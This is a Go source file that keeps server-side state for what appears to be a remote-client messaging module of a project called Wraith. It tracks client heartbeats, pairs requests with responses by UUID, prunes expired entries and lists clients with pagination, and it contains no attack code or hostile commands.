package main

import (
	"sort"
	"sync"
	"time"

	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/proto"
	"github.com/google/uuid"
)

func MkState() *state {
	s := state{
		clients:  map[string]client{},
		requests: map[string]request{},
	}
	return &s
}

type client struct {
	lastHeartbeatTime time.Time
	lastHeartbeat     proto.PacketHeartbeat
}

type request struct {
	target string

	requestTime time.Time
	request     proto.PacketReq

	responseTime time.Time
	response     proto.PacketRes
}

type state struct {
	// List of "connected" Wraith clients.
	clients      map[string]client
	clientsMutex sync.RWMutex

	// List of request/response pairs.
	requests      map[string]request
	requestsMutex sync.RWMutex
}

// Save/update a Wraith client entry.
func (s *state) Heartbeat(src string, hb proto.PacketHeartbeat) {
	s.clientsMutex.Lock()
	defer s.clientsMutex.Unlock()

	s.clients[src] = client{
		lastHeartbeatTime: time.Now(),
		lastHeartbeat:     hb,
	}
}

// Save a request and generate a TxId.
func (s *state) Request(dst string, req proto.PacketReq) proto.PacketReq {
	reqTxId := uuid.NewString()
	req.TxId = reqTxId

	s.requestsMutex.Lock()
	defer s.requestsMutex.Unlock()

	s.requests[reqTxId] = request{
		target:      dst,
		requestTime: time.Now(),
		request:     req,
	}

	return req
}

// Save a response to a request.
func (s *state) Response(src string, res proto.PacketRes) {
	s.requestsMutex.Lock()
	defer s.requestsMutex.Unlock()

	if req, ok := s.requests[res.TxId]; ok && src == req.target && req.responseTime.IsZero() {
		req.responseTime = time.Now()
		req.response = res
		s.requests[res.TxId] = req
	}
}

// Expire timed-out entries in the state.
func (s *state) Prune() {
	wg := sync.WaitGroup{}
	wg.Add(2)

	// Clean up expired client heartbeats.
	go func() {
		defer wg.Done()
		s.clientsMutex.Lock()
		defer s.clientsMutex.Unlock()

		for id, c := range s.clients {
			if time.Since(c.lastHeartbeatTime) > proto.HEARTBEAT_MARK_DEAD_DELAY {
				delete(s.clients, id)
			}
		}
	}()

	// Clean up expired request-response pairs.
	go func() {
		defer wg.Done()
		s.requestsMutex.Lock()
		defer s.requestsMutex.Unlock()

		for id, r := range s.requests {
			if time.Since(r.requestTime) > STATE_REQUEST_EXPIRY_DELAY {
				delete(s.requests, id)
			}
		}
	}()

	wg.Wait()
}

func (s *state) GetClients(offset int, limit int) (map[string]client, int) {
	s.clientsMutex.Lock()
	defer s.clientsMutex.Unlock()

	clientsLength := len(s.clients)

	if offset > clientsLength {
		return map[string]client{}, clientsLength
	}

	length := limit
	if limit > clientsLength {
		length = clientsLength
	}

	sortedKeys := make([]string, offset+length)
	i := 0
	for k := range s.clients {
		sortedKeys[i] = k
		i++
	}
	sort.Strings(sortedKeys)

	wantedKeys := sortedKeys[offset:]
	clientsCopy := make(map[string]client, len(wantedKeys))
	for _, k := range wantedKeys {
		clientsCopy[k] = s.clients[k]
	}

	return clientsCopy, clientsLength
}
